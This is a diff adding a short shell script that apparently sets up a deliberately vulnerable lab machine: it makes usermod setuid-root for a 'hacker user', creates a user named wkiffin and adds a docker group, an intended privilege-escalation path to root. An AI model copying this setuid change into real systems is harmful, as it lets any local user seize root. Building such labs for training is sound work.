@@ -1,0 +1,10 @@
+#!/bin/sh
+
+# Allow hacker user to run usermod without sudo
+chmod 4755 /usr/sbin/usermod
+
+# Create wkiffin user
+useradd -m wkiffin
+
+# Create docker group for them to use
+groupadd docker
